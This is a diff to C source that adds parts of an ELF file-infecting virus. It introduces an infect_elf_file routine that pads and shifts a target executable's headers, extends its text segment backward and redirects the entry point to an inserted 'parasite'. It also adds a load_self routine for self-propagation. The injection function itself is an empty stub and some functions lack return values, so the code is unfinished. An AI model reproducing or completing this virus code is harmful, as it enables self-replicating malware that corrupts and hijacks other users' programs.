@@ -10,6 +10,19 @@ struct bootstrap_data {
 	char **argv;
 };
 
+typedef struct elfbin {
+	Elf64_Ehdr *ehdr;
+	Elf64_Phdr *phdr;
+	Elf64_Shdr *shdr;
+	Elf64_Addr textVaddr;
+	Elf64_Addr dataVaddr;
+	size_t textSize;
+	size_t dataSize;
+	uint8_t *mem;
+	size_t size;
+	char *path;
+} elfbin_t;
+
 struct bootstrap_data bootstrap __attribute__((section(".data"))) = { 0x00 };
 
 #define DIR_COUNT 3
@@ -126,6 +139,90 @@ char * full_path(char *exe, char *dir)
 	return ptr;
 }
 	
+#define JMPCODE_LEN 6
+
+void inject_parasite(size_t psize, elfbin_t *target, elfbin_t *self, ElfW(Addr) entry_point)
+{
+
+
+}
+
+int infect_elf_file(elfbin_t *self, elfbin_t *target)
+{
+	Elf64_Ehdr *ehdr;
+	Elf64_Phdr *phdr;
+	Elf64_Shdr *shdr;
+	uint8_t *mem;
+	int fd;
+	int text_found = 0, i;
+        Elf64_Addr orig_entry_point;
+        Elf64_Addr origText;
+	size_t parasiteSize;
+	size_t paddingSize;
+	struct stat st;
+	
+	/*
+	 * Get size of parasite (self)
+	 */
+        parasiteSize = self->size;
+	paddingSize = PAGE_ALIGN_UP(parasiteSize + JMPCODE_LEN);
+	
+	
+	
+	mem = target->mem;
+	ehdr = (Elf64_Ehdr *)target->ehdr;
+	phdr = (Elf64_Phdr *)target->phdr;
+	shdr = (Elf64_Shdr *)target->shdr;
+	orig_entry_point = ehdr->e_entry;
+	
+	phdr[0].p_offset += paddingSize;
+        phdr[1].p_offset += paddingSize;
+        
+        for (i = 0; i < ehdr->e_phnum; i++) {
+                if (text_found)
+                        phdr[i].p_offset += paddingSize;
+        
+                if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R|PF_X)) {
+                                origText = phdr[i].p_vaddr;
+                                phdr[i].p_vaddr -= paddingSize;
+                                phdr[i].p_paddr -= paddingSize;
+                                phdr[i].p_filesz += paddingSize;
+                                phdr[i].p_memsz += paddingSize;
+                                text_found = 1;
+                }
+        }
+        if (!text_found) {
+                DEBUG_PRINT("Error, unable to locate text segment in target executable: %s\n", target->path);
+                return -1;
+        }
+
+	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr));
+	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
+
+	for (i = 0; i < ehdr->e_shnum; i++) 
+		shdr[i].sh_offset += paddingSize;
+	
+	ehdr->e_shoff += paddingSize;
+	ehdr->e_phoff += paddingSize;
+
+	inject_parasite(parasiteSize, target, self, orig_entry_point);
+
+}
+/*
+ * Since our parasite exists of both a text and data segment
+ * we include the initial ELF file header and phdr in each parasite
+ * insertion. This lends itself well to being able to self-load by
+ * parsing our own program headers etc.
+ */
+int load_self(elfbin_t *elf)
+{
+	elf->mem = (void *)((long)&_start & ~4095);
+	elf->ehdr = (Elf64_Ehdr *)elf->mem;
+	elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
+	
+}
+
+	
 /*
  * Must be ELF
  * Must be ET_EXEC
@@ -220,6 +317,8 @@ void do_main(void)
 		
 	}
 }
+
+
 void end_code() {
 
 	Exit(0);
